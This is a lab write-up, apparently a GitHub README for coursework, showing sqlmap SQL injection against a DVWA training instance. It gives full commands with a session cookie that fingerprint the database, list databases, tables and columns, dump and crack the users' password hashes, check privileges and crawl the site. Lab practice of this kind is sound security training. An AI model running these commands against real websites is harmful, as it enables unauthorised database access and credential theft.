# Hacking-a-SQL-database

<h1>Phase 6</h1>


**<p style="font-size: 15px;">Step 1: Use SQLMAP to Hack a Database.</p>**

To start, I logged into dvwa.structureality.com. This is necessary to access the DVWA database. 

![image](https://github.com/kvweldon/Hacking-a-SQL-database/assets/141193154/0e947fc3-fdfb-411d-94d9-fc5a8c4bb8d3)

I clicked on the SQL Injection tab and entered 1 for the User ID.

![image](https://github.com/kvweldon/Hacking-a-SQL-database/assets/141193154/518e491c-323a-46a3-aa3d-064096cf94cc)

My submission showed that the User ID of 1 is the admin. The submission aslo changed the URL to "http://dvwa.structureality.com/vulnerabilities/sqli/?id=1&Submit=Sumbit#". This URL will be utilized later in the attack.

![image](https://github.com/kvweldon/Hacking-a-SQL-database/assets/141193154/571ee018-082e-4ec6-950c-d46c22ddadf6)

To perform the attack I needed to ascertain the PHPSESSID. I right-clicked on the page, selected Inspect and went to the storage section. These actions brought forth the PHPSESSID which is displayed below.

![image](https://github.com/kvweldon/Hacking-a-SQL-database/assets/141193154/6ca88886-97c0-4483-a0de-d92e5196c681)

Once obtained, I opened a Terminal window and entered "sqlmap -u 'http://dvwa.structureality.com/vulnerabilities/sqli/?id=1&Submit=Submit#' --cookie="PHPSESSID=7sn493728m0g341pk94b5aq9bg; security=low" -b". This command will determine the type of DBMS (database management system) running on the target utilizing SQLMap. The -u flag defines the URL in single quotes, --cookie is used to define the session cookie and the -b flag retrieves the DBMS banner. When prompted, I selected Y to skip testing for other DBMSes. 

![image](https://github.com/kvweldon/Hacking-a-SQL-database/assets/141193154/94178e4f-61c9-45e5-a2f8-7e8035d4e460)

The previous command returned the below result which indicated that DBMS is "MySQL ≥ 5.6" and displays a banner of "8.0.23-0ubuntu0.20.04.1".

![image](https://github.com/kvweldon/Hacking-a-SQL-database/assets/141193154/86db4444-3ff1-4d4e-ac40-bddba9bbdd5f)

Next, I utilized SQLMap to extract the database names from the target system by employing the following command, "sqlmap -u 'http://dvwa.structureality.com/vulnerabilities/sqli/?id=1&Submit=Submit#' --cookie="PHPSESSID=7sn493728m0g341pk94b5aq9bg; security=low" --dbs". The --dbs parameter instructs SQLMap to retrieve the names of the databases. 

![image](https://github.com/kvweldon/Hacking-a-SQL-database/assets/141193154/ec943912-4e45-49aa-add6-5046d2755a56)

The results show there are 6 available databes, dvwa, information_system, mitullidae, mysql, performance_schema, and sys.

![image](https://github.com/kvweldon/Hacking-a-SQL-database/assets/141193154/58bcf6dd-7fb7-4681-b404-15f0f518277b)

I then retrieved the names of the tables of the *dvwa* database by changing the previous command with the parameters "-D", to focus the tool on the named database, and "--tables" to extract the tables from the targeted database.  

"sqlmap -u 'http://dvwa.structureality.com/vulnerabilities/sqli/?id=1&Submit=Submit#' --cookie="PHPSESSID=7sn493728m0g341pk94b5aq9bg; security=low" -D dvwa --tables"

![image](https://github.com/kvweldon/Hacking-a-SQL-database/assets/141193154/a2c2528f-10a7-44e7-b62a-41ad2fe0210a)

The command revealed there are 2 tables in the dvwa database, *guestbook & users*.

![image](https://github.com/kvweldon/Hacking-a-SQL-database/assets/141193154/127762ab-16fc-44ca-bac9-d8196bfdbd8b)

I wanted to extract the names of the columns fromt he *users* table, so I updated the command with the following parameters: "-T" to focus on the *users* table and "--columns" to retrieve the columns of the database.

"sqlmap -u 'http://dvwa.structureality.com/vulnerabilities/sqli/?id=1&Submit=Submit#' --cookie="PHPSESSID=7sn493728m0g341pk94b5aq9bg; security=low" -D dvwa -T users --columns"

![image](https://github.com/kvweldon/Hacking-a-SQL-database/assets/141193154/372092ec-e998-4701-b5c9-ec73ddd48791)

The results show there are eight columns within the *users* table: user
avatar
failed_login
first_name
last_login
last_name
password
user_id

![image](https://github.com/kvweldon/Hacking-a-SQL-database/assets/141193154/e7b7d9da-1242-4681-92a9-051dc66cc9e5)

I then utilized the "--dump" parameter to retrieve the contents of the table. 

sqlmap -u 'http://dvwa.structureality.com/vulnerabilities/sqli/?id=1&Submit=Submit#' --cookie="PHPSESSID=7sn493728m0g341pk94b5aq9bg; security=low" -D dvwa -T users --dump

![image](https://github.com/kvweldon/Hacking-a-SQL-database/assets/141193154/b365aada-3774-42c7-8a49-52f422fd4d60)

I selected *y* to store the hashes to a temporary file and to crack the hashes. I used the default dictionary for this process which was selection 1.

![image](https://github.com/kvweldon/Hacking-a-SQL-database/assets/141193154/dfa4b8d8-16e3-438f-89ba-ee19279ff46f)

The below picture shows 5 entries in the users tables with the hasshed password and the hacked password displayed.

![image](https://github.com/kvweldon/Hacking-a-SQL-database/assets/141193154/a4a0c3c0-175e-47b1-b2d8-c2e0b68189cf)

Next, I used SQLMap to discover the system's hostname supporting the DBMS with the command, "sqlmap -u 'http://dvwa.structureality.com/vulnerabilities/sqli/?id=1&Submit=Submit#' --cookie="PHPSESSID=7sn493728m0g341pk94b5aq9bg; security=low" --hostname".

![image](https://github.com/kvweldon/Hacking-a-SQL-database/assets/141193154/31510a64-d852-4663-bdc2-3578d678c9b8)

The command revealed that the hostname is *lamp10*.

![image](https://github.com/kvweldon/Hacking-a-SQL-database/assets/141193154/de705765-6ad0-4259-8c3e-9e2ecfb1b96f)

I used the following command to use SQLMap to determine the identity of the current database user, "sqlmap -u 'http://dvwa.structureality.com/vulnerabilities/sqli/?id=1&Submit=Submit#' --cookie="PHPSESSID=7sn493728m0g341pk94b5aq9bg; security=low" --current-user".

![image](https://github.com/kvweldon/Hacking-a-SQL-database/assets/141193154/8f3d546b-21ba-4ace-881b-5ee2ca9b6071)

The result indicated the current data user was root@localhost. This account is utilized by DVWA's scripts to interact with its underlying database.

![image](https://github.com/kvweldon/Hacking-a-SQL-database/assets/141193154/30eee76f-dd30-4f3e-90e5-d5e31233c74b)

I then used the "--current-db" parameter to extract the identity of the currently active database. 

"sqlmap -u 'http://dvwa.structureality.com/vulnerabilities/sqli/?id=1&Submit=Submit#' --cookie="PHPSESSID=7sn493728m0g341pk94b5aq9bg; security=low" --current-db"

![image](https://github.com/kvweldon/Hacking-a-SQL-database/assets/141193154/c7164227-f46a-4082-ab2f-e6a60bc058ce)

Below, you can see the current database is *dvwa*.

![image](https://github.com/kvweldon/Hacking-a-SQL-database/assets/141193154/0c7df860-8454-44d6-b801-0b203c16777f)

Next, I used the following command to identify the privileges, roles and whether the current user is the DBA "sqlmap -u 'http://dvwa.structureality.com/vulnerabilities/sqli/?id=1&Submit=Submit#' --cookie="PHPSESSID=7sn493728m0g341pk94b5aq9bg; security=low" --privileges --roles --is-dba".

![image](https://github.com/kvweldon/Hacking-a-SQL-database/assets/141193154/f1d7b932-0c0f-46a4-bee2-ba09b0d00bb8)

![image](https://github.com/kvweldon/Hacking-a-SQL-database/assets/141193154/1f3eb4f5-0ccc-4bbf-88d2-2eb6f7768f72)

![image](https://github.com/kvweldon/Hacking-a-SQL-database/assets/141193154/76693b60-f298-4a2d-ac92-b6002325bcd5)

![image](https://github.com/kvweldon/Hacking-a-SQL-database/assets/141193154/d6adb983-0a42-447c-8abc-384a88ae8070)

Finally, I used SQLMap to perform a crawl of the target site to a depth of 3. This means that SQLMap will not only test the original URL you provided but also follow any links on that page to other pages on the same domain (level 1), then follow links on those pages to other pages (level 2), and finally follow links on level 2 pages to other pages (level 3).

sqlmap -u 'http://dvwa.structureality.com/vulnerabilities/sqli/?id=1&Submit=Submit#' --cookie="PHPSESSID=7sn493728m0g341pk94b5aq9bg; security=low" -crawl=3

![image](https://github.com/kvweldon/Hacking-a-SQL-database/assets/141193154/33a8e2a0-63b5-4eb6-bf9c-757226a01fd7)

![image](https://github.com/kvweldon/Hacking-a-SQL-database/assets/141193154/61f89795-22df-4ca6-afb0-0d57bd62d122)



























